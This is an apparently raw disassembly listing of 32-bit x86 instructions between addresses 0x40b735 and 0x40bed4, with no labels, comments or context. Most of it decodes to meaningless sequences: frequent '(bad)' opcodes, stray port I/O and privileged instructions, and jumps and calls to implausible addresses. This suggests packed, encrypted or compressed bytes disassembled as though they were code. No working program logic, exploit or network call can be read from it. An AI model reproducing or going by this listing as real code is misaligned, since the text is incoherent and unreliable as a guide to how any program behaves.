  40b735:	adc    al,0xfd
  40b737:	mov    dl,0x34
  40b739:	xor    eax,0x8100553a
  40b73e:	js     0x40b768
  40b740:	inc    DWORD PTR [eax]
  40b742:	scas   eax,DWORD PTR es:[edi]
  40b743:	das    
  40b744:	inc    esp
  40b745:	ror    BYTE PTR [ebp-0xd],1
  40b748:	mov    edi,0xe4633f50
  40b74d:	jmp    DWORD PTR [ebp+0x6c35fdab]
  40b753:	push   cs
  40b754:	inc    ecx
  40b755:	add    BYTE PTR [eax],al
  40b757:	xor    eax,0x2effff74
  40b75c:	inc    esp
  40b75d:	int3   
  40b75e:	sbb    ebx,DWORD PTR [ebx-0x20]
  40b761:	add    BYTE PTR [edi+0x33],bh
  40b764:	mov    dh,0x0
  40b766:	mov    BYTE PTR [edi],dl
  40b768:	cmp    DWORD PTR [ebp+0x14],0x18
  40b76c:	je     0x40cf5f
  40b772:	fistp  DWORD PTR [edx-0x30]
  40b775:	add    BYTE PTR [edi+0x33],cl
  40b778:	mov    ds:0x8d174800,al
  40b77d:	inc    ebp
  40b77e:	add    BYTE PTR [eax],al
  40b780:	adc    al,0xe8
  40b782:	(bad)  
  40b783:	jne    0x40b7a9
  40b785:	ror    BYTE PTR [esi-0x3],1
  40b788:	aas    
  40b789:	fmul   QWORD PTR [ecx]
  40b78b:	ror    BYTE PTR [edi+0x33],0x8e
  40b78f:	add    BYTE PTR [eax],bl
  40b791:	pop    ss
  40b792:	cmp    DWORD PTR [ebp-0x2c],0x16
  40b796:	je     0x40cf31
  40b79c:	(bad)  
  40b79d:	repnz (bad) 
  40b79f:	push   eax
  40b7a0:	jmp    DWORD PTR [ecx-0x30]
  40b7a3:	call   0x3e91b2
  40b7a8:	add    edx,edi
  40b7aa:	jb     0x40b821
  40b7ac:	mov    ebx,DWORD PTR [edx-0x38]
  40b7af:	add    BYTE PTR [ecx*2-0x3427ef98],ah
  40b7b6:	mov    esp,0xe6b045ff
  40b7bb:	jbe    0x40b7ee
  40b7bd:	sbb    cl,cl
  40b7bf:	dec    dh
  40b7c1:	pop    es
  40b7c2:	in     al,0xfe
  40b7c4:	cmp    al,0xa5
  40b7c6:	fcmove st,st(4)
  40b7c8:	dec    esp
  40b7c9:	xor    cl,al
  40b7cb:	(bad)  
  40b7cc:	cmp    al,0x89
  40b7ce:	(bad)  
  40b7cf:	je     0x40b80a
  40b7d1:	xchg   ebp,eax
  40b7d2:	les    ebp,FWORD PTR [esi+eiz*4+0x39]
  40b7d6:	enter  0x7974,0x51
  40b7da:	dec    esi
  40b7db:	or     BYTE PTR [ecx-0x7100aa6f],cl
  40b7e1:	popa   
  40b7e2:	dec    esi
  40b7e3:	les    eax,FWORD PTR [eax]
  40b7e5:	add    BYTE PTR [esi+0x4feae6f],al
  40b7eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b7ec:	fidivr DWORD PTR [esp+eax*1-0x16]
  40b7f0:	(bad)  
  40b7f1:	(bad)  
  40b7f2:	in     al,0xf4
  40b7f4:	(bad)  
  40b7f5:	je     0x40b778
  40b7f7:	stc    
  40b7f8:	dec    ebp
  40b7f9:	or     BYTE PTR [ecx-0x5f],cl
  40b7fc:	push   ebp
  40b7fd:	call   DWORD PTR [esi+0x3d]
  40b800:	inc    esi
  40b801:	int3   
  40b802:	xor    DWORD PTR [ecx-0x33b7d13],ecx
  40b808:	(bad)  
  40b809:	je     0x40b839
  40b80b:	es ds int3 
  40b80e:	ss ins BYTE PTR es:[edi],dx
  40b810:	(bad)  
  40b811:	je     0x40b84c
  40b813:	adc    esp,DWORD PTR [ebx]
  40b815:	ins    DWORD PTR es:[edi],dx
  40b816:	es mov ebx,0xbb8b09da
  40b81c:	lds    esi,FWORD PTR [ecx+ebp*1-0x2d]
  40b820:	out    dx,eax
  40b821:	ins    BYTE PTR es:[edi],dx
  40b822:	push   cs
  40b823:	jecxz  0x40b7eb
  40b825:	je     0x40b82c
  40b827:	les    eax,FWORD PTR [edx-0x398d0191]
  40b82d:	je     0x40b828
  40b82f:	ror    DWORD PTR [edx+0x70],cl
  40b832:	out    dx,al
  40b833:	add    dh,0x74
  40b836:	fst    QWORD PTR [ecx+edx*4]
  40b839:	push   ebx
  40b83a:	popa   
  40b83b:	mov    cl,0x9d
  40b83d:	(bad)  
  40b83e:	pop    ebp
  40b83f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b840:	sbb    BYTE PTR [ebx+0x41],0xb1
  40b844:	(bad)  
  40b845:	(bad)  
  40b846:	cmp    eax,0x6390c0
  40b84b:	add    BYTE PTR [ecx-0x4f],al
  40b84e:	jge    0x40b817
  40b850:	cmp    eax,0x212b80bc
  40b855:	mov    cl,0x6d
  40b857:	(bad)  
  40b858:	sbb    eax,0x213350b8
  40b85d:	mov    cl,0x5d
  40b85f:	(bad)  
  40b860:	sbb    eax,0x13b40b4
  40b865:	mov    cl,0x4d
  40b867:	(bad)  
  40b868:	std    
  40b869:	iret   
  40b86a:	push   eax
  40b86b:	inc    ebx
  40b86c:	add    DWORD PTR [ecx-0x340238c3],esi
  40b872:	inc    eax
  40b873:	or     esp,ecx
  40b875:	mov    al,0x2d
  40b877:	(bad)  
  40b878:	ffree  st(7)
  40b87a:	adc    BYTE PTR [ebx],dl
  40b87c:	loope  0x40b82e
  40b87e:	sbb    eax,0xc3ddc7
  40b883:	sbb    eax,ecx
  40b885:	mov    al,0xd
  40b887:	(bad)  
  40b888:	mov    ebp,0xc12310df
  40b88d:	mov    al,0xfd
  40b88f:	mov    esp,0x30e92070
  40b894:	mov    edx,0xec067bf
  40b899:	test   eax,0x56adc6e5
  40b89e:	fnsave [ebx]
  40b8a0:	push   ss
  40b8a1:	daa    
  40b8a2:	in     eax,0xc6
  40b8a4:	inc    ebp
  40b8a5:	push   eax
  40b8a6:	add    BYTE PTR [ebp+0x31],al
  40b8a9:	mov    esp,0x1431424c
  40b8ae:	bnd ret 
  40b8b0:	add    BYTE PTR [eax],al
  40b8b2:	daa    
  40b8b3:	xchg   edi,eax
  40b8b4:	(bad)  
  40b8b5:	fdiv   QWORD PTR ds:0x71a60014
  40b8bb:	lods   al,BYTE PTR ds:[esi]
  40b8bc:	(bad)  
  40b8bd:	call   0x2507ccf4
  40b8c2:	add    DWORD PTR [edx+0x3e32e906],esi
  40b8c8:	add    BYTE PTR [ebx],al
  40b8ca:	sub    eax,0x3513003e
  40b8cf:	lahf   
  40b8d0:	inc    esp
  40b8d1:	jne    0x40b8d5
  40b8d3:	lahf   
  40b8d4:	test   BYTE PTR [ecx+0x7f],bh
  40b8d7:	mov    cl,0xfe
  40b8d9:	sbb    DWORD PTR [esi+0x27],ebp
  40b8dc:	clc    
  40b8dd:	add    WORD PTR [eax+0x13f317e7],si
  40b8e4:	add    dl,ah
  40b8e6:	jb     0x40b90c
  40b8e8:	add    eax,0xfeb0d740
  40b8ed:	jmp    0xa86897cc
  40b8f2:	xor    dh,BYTE PTR [ecx+0x4b8ae574]
  40b8f8:	jae    0x40b928
  40b8fa:	outs   dx,DWORD PTR ds:[esi]
  40b8fb:	pusha  
  40b8fc:	mov    edi,DWORD PTR [ecx]
  40b8fe:	fst    DWORD PTR [edi-0x4e90e911]
  40b904:	dec    edi
  40b905:	mov    ebx,0xe735b6a
  40b90a:	outs   dx,DWORD PTR ds:[esi]
  40b90b:	fwait
  40b90c:	test   BYTE PTR [ecx],dl
  40b90e:	outs   dx,DWORD PTR ds:[esi]
  40b90f:	mov    cl,0xfe
  40b911:	adc    edi,ecx
  40b913:	inc    ecx
  40b914:	push   esi
  40b916:	add    BYTE PTR [eax],al
  40b918:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b919:	pop    eax
  40b91a:	lock cdq 
  40b91c:	mov    al,BYTE PTR ds:0xaf352843
  40b922:	mov    ah,0xd1
  40b924:	in     al,0xae
  40b926:	(bad)  
  40b927:	(bad)  
  40b928:	ds push eax
  40b92a:	sub    DWORD PTR [eax],ebp
  40b92c:	sub    eax,0x3a009cbc
  40b931:	fscale 
  40b933:	mov    DWORD PTR [ebp-0x58000a34],ecx
  40b939:	xchg   ebp,eax
  40b93a:	mov    ebx,0xfdd99fec
  40b93f:	add    BYTE PTR [edx+edi*8],bh
  40b942:	cmp    BYTE PTR [ebp-0x48],0x14
  40b946:	jne    0x40b991
  40b948:	push   ebx
  40b949:	das    
  40b94a:	jmp    0x40b943
  40b94c:	mov    bh,0xd9
  40b94e:	std    
  40b94f:	xor    BYTE PTR [edi+0x2f],al
  40b952:	jmp    0x40b94b
  40b954:	aaa    
  40b955:	fnstcw WORD PTR [edi-0x43]
  40b958:	mov    ah,0xe1
  40b95a:	std    
  40b95b:	push   DWORD PTR [eax+0x7e000015]
  40b961:	lods   eax,DWORD PTR ds:[esi]
  40b962:	lds    eax,FWORD PTR [ebp-0x21f1c]
  40b968:	lock adc al,0x0
  40b96b:	add    bl,dh
  40b96d:	mov    ecx,0xe0e48dfd
  40b972:	std    
  40b973:	push   DWORD PTR [edi]
  40b975:	lahf   
  40b976:	jmp    0xb5:0xfdd927f7
  40b97d:	add    al,dh
  40b97f:	loopne 0x40b97e
  40b981:	call   DWORD PTR [edi]
  40b983:	pop    edi
  40b984:	or     al,ch
  40b986:	nop
  40b987:	xlat   BYTE PTR ds:[ebx]
  40b988:	std    
  40b989:	(bad)  
  40b98a:	fist   DWORD PTR [esi-0x26c80816]
  40b990:	(bad)  
  40b991:	je     0x40b9a8
  40b993:	fnstenv [ebx-0x227c014]
  40b999:	call   0x4001a2
  40b99e:	pop    ss
  40b99f:	sahf   
  40b9a0:	jmp    0x6711:0xe6d817f7
  40b9a7:	fscale 
  40b9a9:	push   DWORD PTR [ecx]
  40b9ab:	nop
  40b9ac:	(bad)  
  40b9ae:	push   es
  40b9af:	faddp  st(3),st
  40b9b1:	je     0x40b9dc
  40b9b3:	(bad)
  40b9b6:	imul   BYTE PTR [ebp-0x3d]
  40b9b9:	mov    ah,0xd9
  40b9bb:	ins    DWORD PTR es:[edi],dx
  40b9bc:	ret    
  40b9bd:	(bad)  
  40b9be:	fldenv [esp+edx*2-0x1]
  40b9c2:	fidiv  WORD PTR [ebp+0x3d]
  40b9c5:	clc    
  40b9c6:	enter  0xc471,0xfe
  40b9ca:	into   
  40b9cb:	test   DWORD PTR [ebp-0x4],ecx
  40b9ce:	fsqrt  
  40b9d0:	inc    edx
  40b9d1:	add    BYTE PTR [ecx],dh
  40b9d3:	rol    BYTE PTR fs:[edi],0x31
  40b9d7:	or     BYTE PTR [ecx-0x15],bh
  40b9da:	mov    dl,0x80
  40b9dc:	(bad)  
  40b9dd:	imul   esi,DWORD PTR [ecx],0xff1413
  40b9e3:	add    BYTE PTR [eiz*4+0x4e0509da],ah
  40b9ea:	les    ecx,FWORD PTR [eax-0x4a4b70c]
  40b9f0:	repz jnp 0x40b9f5
  40b9f3:	inc    DWORD PTR [eiz*4-0x12885d26]
  40b9fa:	ret    
  40b9fb:	(bad)  
  40b9fc:	in     al,0xe8
  40b9fe:	ret    
  40b9ff:	je     0x40ba3a
  40ba01:	push   ebp
  40ba02:	push   cs
  40ba03:	ins    BYTE PTR es:[edi],dx
  40ba04:	pop    esi
  40ba05:	cmc    
  40ba06:	mov    ecx,0x2dbd2dc1
  40ba0b:	mov    ebx,DWORD PTR [ebp+0x39]
  40ba0e:	mov    edi,0x5865dffb
  40ba13:	add    bl,cl
  40ba15:	imul   eax,ebx,0x74
  40ba18:	sub    DWORD PTR ds:0xa72e6aac,eax
  40ba1e:	js     0x40ba64
  40ba20:	and    eax,0x49750e33
  40ba25:	adc    al,0x28
  40ba27:	add    al,0xaa
  40ba29:	out    dx,eax
  40ba2a:	pop    edi
  40ba2b:	in     al,dx
  40ba2c:	jno    0x40ba42
  40ba2e:	imul   eax,DWORD PTR [ebx],0x2c242831
  40ba34:	int    0x51
  40ba36:	sub    BYTE PTR [esi+ebx*2],al
  40ba39:	mov    esp,0x143144dc
  40ba3e:	loop   0x40ba03
  40ba40:	bound  ecx,QWORD PTR ds:0x2c1fac17
  40ba46:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba47:	ret    
  40ba48:	add    BYTE PTR [eax],al
  40ba4a:	data16 cmp al,0xe9
  40ba4d:	add    ebx,esi
  40ba4f:	outs   dx,BYTE PTR ds:[esi]
  40ba50:	add    BYTE PTR [edx+0x73],bh
  40ba53:	push   ebx
  40ba54:	jmp    0xf16878ac
  40ba59:	stos   DWORD PTR es:[edi],eax
  40ba5a:	add    DWORD PTR [ecx+0x4f96c37d],eax
  40ba60:	pop    es
  40ba61:	ret    
  40ba62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ba63:	mov    ecx,0xeeb149e7
  40ba68:	call   0x5d9755a5
  40ba6d:	test   esi,0x87c3556b
  40ba73:	lods   eax,DWORD PTR ds:[esi]
  40ba74:	pop    edx
  40ba75:	jb     0x40babd
  40ba77:	adc    eax,0x27777ebc
  40ba7c:	cmp    eax,0x411be5c3
  40ba81:	jge    0x40ba5e
  40ba83:	lods   al,BYTE PTR ds:[esi]
  40ba84:	sub    eax,0x2adaff63
  40ba89:	or     BYTE PTR [ecx],dh
  40ba8b:	inc    edi
  40ba8c:	jb     0x40ba3e
  40ba8e:	mov    bl,0xd8
  40ba90:	adc    BYTE PTR [edi+0x6e],dl
  40ba93:	push   edi
  40ba94:	adc    DWORD PTR [ecx+esi*1],eax
  40ba97:	adc    al,0xe9
  40ba99:	retf   0xafed
  40ba9c:	call   0x54eba4
  40baa1:	bound  edi,QWORD PTR [eax+0x20]
  40baa4:	xor    DWORD PTR [ecx+0x12092732],0xffffffed
  40baab:	stc    
  40baac:	rol    DWORD PTR [edx+0x0],1
  40baaf:	add    ah,bh
  40bab1:	ror    BYTE PTR [ebx],cl
  40bab3:	jmp    0xe940cf3f
  40bab8:	xor    bh,BYTE PTR [ecx+0x4716a60]
  40babe:	add    BYTE PTR ds:0xd9449938,dh
  40bac4:	mov    ch,0x4
  40bac6:	push   DWORD PTR [ecx+eax*2]
  40bac9:	lods   eax,DWORD PTR ds:[esi]
  40baca:	je     0x40babd
  40bacc:	mov    bl,ch
  40bace:	addr16 sahf 
  40bad0:	repz xchg ecx,eax
  40bad2:	cli    
  40bad3:	loopne 0x40bade
  40bad5:	pop    ss
  40bad6:	or     DWORD PTR [edi*2-0x37e6ba47],esp
  40badd:	sub    eax,0x1b737eff
  40bae2:	inc    ebp
  40bae3:	jno    0x40baef
  40bae5:	jnp    0x40bb66
  40bae7:	jmp    0xebb5cf1e
  40baec:	(bad)  
  40baed:	loope  0x40ba71
  40baef:	bound  edi,QWORD PTR [edx]
  40baf1:	daa    
  40baf2:	adc    eax,0x8aabf962
  40baf7:	mov    ah,0xbe
  40baf9:	sbb    eax,0xd32a2ba4
  40bafe:	fcomip st,st(1)
  40bb00:	mov    ebp,0x960f857
  40bb05:	mov    al,0xea
  40bb07:	fisubr DWORD PTR [edi-0x68d07a9]
  40bb0d:	scas   eax,DWORD PTR es:[edi]
  40bb0e:	push   cs
  40bb0f:	inc    ebp
  40bb10:	je     0x40bb27
  40bb12:	ror    DWORD PTR [ecx],0x0
  40bb15:	add    BYTE PTR [ebx],bh
  40bb17:	fwait
  40bb18:	inc    esp
  40bb19:	adc    DWORD PTR [ebp-0x74ff03b9],ebp
  40bb1f:	xchg   ebp,eax
  40bb20:	stc    
  40bb21:	or     DWORD PTR [esi+0xc458989],esp
  40bb27:	xchg   ebx,eax
  40bb28:	add    BYTE PTR ss:[ebp+0x43c02b1d],ah
  40bb2f:	ret    0x6e9
  40bb32:	adc    DWORD PTR [ebx-0x8],0xffffff8b
  40bb36:	inc    ebp
  40bb37:	aam    0x59
  40bb39:	leave  
  40bb3a:	retf   0x4
  40bb3d:	push   ebp
  40bb3e:	and    DWORD PTR [ecx+eax*4-0x3c],0xffffffa4
  40bb43:	aaa    
  40bb44:	mov    bl,0x66
  40bb46:	sbb    DWORD PTR [eax],edx
  40bb48:	cmp    DWORD PTR [ebp-0x4],eax
  40bb4b:	in     eax,dx
  40bb4c:	add    eax,0xc0df882b
  40bb51:	adc    al,bl
  40bb53:	aam    0x33
  40bb55:	mov    ah,0x36
  40bb57:	push   edi
  40bb58:	add    al,ch
  40bb5a:	das    
  40bb5b:	sti    
  40bb5c:	(bad)  
  40bb5d:	inc    DWORD PTR [ecx+0x53]
  40bb60:	clc    
  40bb61:	lea    edx,[ebp-0x2c]
  40bb64:	dec    esi
  40bb65:	call   0x3fb756
  40bb6a:	pavgw  mm2,QWORD PTR [ebx]
  40bb6d:	push   DWORD PTR [ebp+0x1b]
  40bb70:	push   DWORD PTR [ebp+0x10]
  40bb73:	aad    0x73
  40bb75:	or     al,dh
  40bb77:	inc    WORD PTR ds:[eax]
  40bb7b:	add    bh,ch
  40bb7d:	sbb    al,al
  40bb7f:	(bad)  
  40bb81:	ds (bad) 
  40bb83:	call   FWORD PTR [eax-0x2c]
  40bb86:	jae    0x40bb94
  40bb88:	pop    ds
  40bb89:	jecxz  0x40bb82
  40bb8b:	jmp    DWORD PTR [ebp-0x5a061995]
  40bb91:	aam    0xfd
  40bb93:	mov    edx,DWORD PTR [ebp+0x31453b1b]
  40bb99:	lods   eax,DWORD PTR ds:[esi]
  40bb9a:	jae    0x437935
  40bba0:	sub    BYTE PTR ss:[edi],dl
  40bba3:	jmp    DWORD PTR [ebp+eiz*4-0x5d715e56]
  40bbaa:	mov    edi,0xaba17488
  40bbaf:	jae    0x40bbc7
  40bbb1:	loopne 0x40bb6a
  40bbb3:	sub    ah,bl
  40bbb5:	and    eax,0x17fef446
  40bbba:	js     0x40bc21
  40bbbc:	jo     0x40bb7b
  40bbbe:	or     edx,edx
  40bbc0:	jge    0x40bb81
  40bbc2:	stos   DWORD PTR es:[edi],eax
  40bbc3:	addr16 pop ebx
  40bbc5:	mov    ebp,0xb55cff52
  40bbca:	stos   BYTE PTR es:[edi],al
  40bbcb:	mov    BYTE PTR [ebp+0x7a],dl
  40bbce:	mov    edi,0xbfa95cfe
  40bbd3:	je     0x40bc0e
  40bbd5:	test   DWORD PTR [ebx],esi
  40bbd7:	mov    BYTE PTR [bx+di+0x548b],0x25
  40bbdd:	ds std 
  40bbdf:	inc    DWORD PTR [eax]
  40bbe1:	add    BYTE PTR ds:0xb847abbf,bh
  40bbe7:	out    dx,eax
  40bbe8:	mov    bh,0x8a
  40bbea:	xor    al,0xe9
  40bbec:	sub    BYTE PTR [ecx+0x31],al
  40bbef:	ds stos BYTE PTR es:[edi],al
  40bbf1:	add    eax,DWORD PTR [eax]
  40bbf3:	xor    dh,BYTE PTR [esi]
  40bbf5:	adc    al,0xe0
  40bbf7:	dec    ecx
  40bbf8:	ss clc 
  40bbfa:	xchg   bh,al
  40bbfc:	or     ch,al
  40bbfe:	push   esi
  40bbff:	sar    BYTE PTR [edi-0x3d5a2702],cl
  40bc05:	je     0x40bc3a
  40bc07:	inc    esi
  40bc08:	out    0x50,al
  40bc0a:	addr16 mov dx,0xe4fe
  40bc0f:	clc    
  40bc10:	stos   BYTE PTR es:[edi],al
  40bc11:	jns    0x40bbdf
  40bc13:	adc    esp,DWORD PTR [esi]
  40bc15:	ror    BYTE PTR [edi+0x20],0x1d
  40bc19:	stos   DWORD PTR es:[edi],eax
  40bc1a:	ret    0x162f
  40bc1d:	sar    ch,0x13
  40bc20:	jmp    0xeb62eb68
  40bc25:	lods   al,BYTE PTR ds:[esi]
  40bc26:	ss xchg ebp,eax
  40bc28:	jnp    0x40bbe1
  40bc2a:	and    DWORD PTR es:[edi-0x54],ebp
  40bc2e:	inc    esi
  40bc2f:	test   eax,0x170ebf73
  40bc34:	dec    ebp
  40bc35:	mov    edi,0xc023d20f
  40bc3a:	push   es
  40bc3b:	stos   BYTE PTR es:[edi],al
  40bc3c:	call   0xf5906644
  40bc41:	(bad)  
  40bc42:	imul   BYTE PTR [ecx+0x3e8]
  40bc48:	xor    DWORD PTR [ecx+0x27cebc33],ebp
  40bc4e:	inc    ebp
  40bc4f:	mov    edi,0xc0239ddf
  40bc54:	jmp    0x6444b52f
  40bc59:	popf   
  40bc5a:	mov    WORD PTR [edi-0x46],ss
  40bc5d:	dec    edi
  40bc5e:	in     eax,0x82
  40bc60:	jle    0x40bc7e
  40bc62:	cmp    DWORD PTR [ebp+esi*1-0x444079c8],ebp
  40bc69:	lods   al,BYTE PTR ds:[esi]
  40bc6a:	jge    0x40bca5
  40bc6c:	xor    eax,0x25beed99
  40bc71:	add    al,0x5e
  40bc73:	inc    edi
  40bc74:	sub    eax,0x310fe395
  40bc79:	and    dh,ch
  40bc7b:	mov    esi,0x476417fd
  40bc80:	sub    DWORD PTR [esi+ecx*2+0x39],eax
  40bc84:	sub    DWORD PTR [edx+ebx*2+0x71a96e30],edi
  40bc8b:	dec    ecx
  40bc8c:	cmp    eax,0xdaf0ff9b
  40bc91:	adc    eax,DWORD PTR [eax]
  40bc93:	jmp    0x2c0a05ca
  40bc98:	and    eax,0x81725514
  40bc9d:	xchg   esi,eax
  40bc9e:	ret    
  40bc9f:	sbb    eax,0x261440aa
  40bca4:	xor    edx,DWORD PTR [eax+eax*1]
  40bca7:	jmp    0xf712b9de
  40bcac:	add    BYTE PTR [eax],al
  40bcae:	jns    0x40bcc8
  40bcb0:	add    ecx,ebp
  40bcb2:	xor    dl,BYTE PTR [edi+ecx*1]
  40bcb5:	push   ebp
  40bcb6:	repz xchg ebp,eax
  40bcb8:	jl     0x40bcaf
  40bcba:	xor    bl,BYTE PTR [edi]
  40bcbc:	adc    ebx,esi
  40bcbe:	dec    ecx
  40bcbf:	add    BYTE PTR [edx-0x16],ch
  40bcc2:	dec    eax
  40bcc3:	adc    al,0x6a
  40bcc5:	jmp    0xc73f5594
  40bcca:	scas   eax,DWORD PTR es:[edi]
  40bccb:	mov    ebx,0x1432eb28
  40bcd0:	xor    DWORD PTR [ecx+eax*2],0x13
  40bcd4:	jne    0x40bce0
  40bcd6:	xchg   esi,eax
  40bcd7:	pop    ds
  40bcd8:	adc    BYTE PTR [esi-0x5317e3f7],ah
  40bcde:	or     al,0xa9
  40bce0:	(bad)  
  40bce1:	pusha  
  40bce2:	imul   ebp,DWORD PTR [eax+0x3e1914fe],0x97391300
  40bcec:	inc    esp
  40bced:	jge    0x40bcf1
  40bcef:	mov    esp,0xa9df7666
  40bcf4:	call   0x54ede2
  40bcf9:	push   0xfffffff1
  40bcfb:	pop    ss
  40bcfc:	add    dl,ah
  40bcfe:	xchg   ebx,eax
  40bcff:	test   eax,0x1fbff974
  40bd04:	or     BYTE PTR [ecx+0x3f],al
  40bd07:	xor    bh,bh
  40bd09:	add    bh,dh
  40bd0b:	xchg   edi,eax
  40bd0c:	inc    ebx
  40bd0d:	cld    
  40bd0e:	daa    
  40bd0f:	in     al,dx
  40bd10:	adc    ebp,DWORD PTR [edx+0x0]
  40bd13:	add    BYTE PTR [eax-0x6],cl
  40bd16:	add    ecx,DWORD PTR [ebp-0x17b19773]
  40bd1c:	push   esi
  40bd1d:	imul   edi,ebp,0xffc221ff
  40bd23:	dec    DWORD PTR [eax-0x6b]
  40bd26:	jnp    0x40bd34
  40bd28:	dec    ebx
  40bd29:	jmp    0x40bd4a
  40bd2b:	jmp    FWORD PTR [ebp+0x27036a03]
  40bd31:	loopne 0x40bd3a
  40bd33:	call   0x3faea4
  40bd38:	pop    es
  40bd39:	loopne 0x40bd4e
  40bd3b:	push   0x1b
  40bd3d:	(bad)  
  40bd3e:	jmp    FWORD PTR [ecx+0x18]
  40bd41:	jl     0x40bd59
  40bd43:	jmp    edi
  40bd45:	imul   esp,edi,0x1409b1
  40bd4b:	xor    DWORD PTR [ebp+0x4],0x4
  40bd4f:	jne    0x40bd8c
  40bd51:	imul   esi,DWORD PTR [ebx+0x10],0xe807dfa7
  40bd58:	test   bh,ch
  40bd5a:	(bad)  
  40bd5b:	inc    DWORD PTR [ecx+0x4f]
  40bd5e:	cld    
  40bd5f:	call   FWORD PTR ds:0x32006a0c
  40bd65:	sbb    al,0x8d
  40bd67:	inc    ebp
  40bd68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bd69:	inc    eax
  40bd6a:	call   0xfdaa745e
  40bd6f:	jmp    0x40d094
  40bd74:	or     esp,edi
  40bd76:	or     eax,DWORD PTR ds:0x9d0000
  40bd7c:	push   DWORD PTR [ebp-0x78]
  40bd7f:	std    
  40bd80:	add    eax,0xe81b5dff
  40bd85:	push   ebp
  40bd86:	xor    edi,edx
  40bd88:	mov    ebx,0x2bcb9fe
  40bd8d:	add    BYTE PTR [ecx],dh
  40bd8f:	inc    esp
  40bd90:	sub    DWORD PTR [ecx],eax
  40bd92:	xor    DWORD PTR [ebp-0x48d28381],edi
  40bd98:	xor    eax,0x12605620
  40bd9d:	push   0x39
  40bd9f:	out    dx,al
  40bda0:	or     BYTE PTR ss:[ecx-0x4b],bl
  40bda4:	and    al,0xff
  40bda6:	ds (bad) 
  40bda8:	ss adc al,0xcb
  40bdab:	mov    ecx,0xbd9b0028
  40bdb0:	stos   BYTE PTR es:[edi],al
  40bdb1:	stos   DWORD PTR es:[edi],eax
  40bdb2:	daa    
  40bdb3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bdb4:	mov    ebx,0x2bc74e8
  40bdb9:	add    BYTE PTR [edx-0x7bf8f0c9],dh
  40bdbf:	sbb    eax,0x432174bd
  40bdc4:	or     al,0xff
  40bdc6:	test   BYTE PTR [ebp-0x2970ee56],dh
  40bdcc:	mov    ebx,0x28c964fe
  40bdd1:	add    ebx,DWORD PTR [ebx-0x43]
  40bdd4:	sub    BYTE PTR [eax],al
  40bdd6:	leave  
  40bdd7:	ss mov ebp,0x1bd3d6fe
  40bddd:	add    DWORD PTR [eax],eax
  40bddf:	add    BYTE PTR [ecx],dh
  40bde1:	mov    ebp,0xa5357c7f
  40bde6:	xor    eax,0xbff7f61c
  40bdeb:	push   DWORD PTR [esi+0x24ff02bc]
  40bdf1:	leave  
  40bdf2:	sub    BYTE PTR [eax],al
  40bdf4:	sbb    esi,DWORD PTR [ecx+0xc9d448d]
  40bdfa:	lods   al,BYTE PTR ds:[esi]
  40bdfb:	arpl   WORD PTR [edi-0x731743cb],dx
  40be01:	adc    ebp,ecx
  40be03:	add    esi,DWORD PTR [ecx]
  40be05:	xchg   ebx,eax
  40be06:	fisttp DWORD PTR [edi]
  40be08:	sub    BYTE PTR [ecx],ah
  40be0a:	cmc    
  40be0b:	(bad)  
  40be0c:	in     eax,dx
  40be0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40be0e:	out    0x3,eax
  40be10:	xor    DWORD PTR [esi+eax*2],edx
  40be13:	ss cmp eax,0x3529e93a
  40be19:	cdq    
  40be1a:	stos   DWORD PTR es:[edi],eax
  40be1b:	mov    edi,0xbdaabbe6
  40be20:	dec    edi
  40be21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40be22:	psubusb mm0,QWORD PTR [esi-0x5a]
  40be26:	call   0xe3587bab
  40be2b:	sub    ebp,DWORD PTR ss:[eax+ebp*8+0x3]
  40be30:	xor    DWORD PTR [eax+edx*1],edx
  40be33:	enter  0xa626,0xe8
  40be37:	sbb    BYTE PTR [ebp+0x2b36e218],0x6c
  40be3e:	call   0xd054ef46
  40be43:	jg     0x40be45
  40be45:	add    BYTE PTR [esi],al
  40be47:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40be48:	call   0xe5593bd3
  40be4d:	xor    eax,0x30bb195c
  40be52:	adc    BYTE PTR [ebx+0x14310843],0x29
  40be59:	add    ah,BYTE PTR [edx+0x5c]
  40be5c:	mov    dh,0x31
  40be5e:	and    eax,0xb3b02395
  40be63:	aaa    
  40be64:	popf   
  40be65:	or     al,ah
  40be67:	aaa    
  40be68:	xchg   ebp,eax
  40be69:	mov    ebx,0x8680a045
  40be6e:	dec    eax
  40be6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40be70:	lea    ecx,[ebp+0x3185abf5]
  40be76:	inc    ecx
  40be77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40be78:	repz scas eax,DWORD PTR es:[edi]
  40be7a:	lahf   
  40be7b:	pop    ds
  40be7c:	add    BYTE PTR [ecx-0x26],dh
  40be7f:	and    BYTE PTR [eax],cl
  40be81:	add    DWORD PTR [eax],0xca66ff31
  40be87:	and    BYTE PTR [ebx+edx*8],dl
  40be8a:	xor    al,0xa5
  40be8c:	je     0x40beeb
  40be8e:	mov    edx,0x8441f820
  40be93:	test   al,0xfe
  40be95:	inc    esi
  40be96:	stos   BYTE PTR es:[edi],al
  40be97:	and    al,bh
  40be99:	push   ecx
  40be9a:	pop    edx
  40be9b:	cmp    edi,edi
  40be9d:	ss aad 0x13
  40bea0:	add    cl,ch
  40bea2:	xor    bh,BYTE PTR [ecx+0x18086a5f]
  40bea8:	or     eax,0xe100009b
  40bead:	sbb    dl,dl
  40beaf:	pushf  
  40beb0:	fst    QWORD PTR [edx+0x1432dd7c]
  40beb6:	inc    eax
  40beb7:	out    dx,eax
  40beb8:	pop    edi
  40beb9:	pop    esp
  40beba:	push   DWORD PTR [esi+esi*1-0x6b]
  40bebe:	inc    esp
  40bebf:	std    
  40bec0:	scas   eax,DWORD PTR es:[edi]
  40bec1:	aaa    
  40bec2:	hlt    
  40bec3:	fsubr  st(5),st
  40bec5:	aaa    
  40bec6:	hlt    
  40bec7:	out    0x41,al
  40bec9:	mov    al,ds:0xa54f06e7
  40bece:	(bad)  
  40becf:	pusha  
  40bed0:	jno    0x40be7e
  40bed2:	(bad)  
  40bed3:	push   esp
  40bed4:	inc    ebp
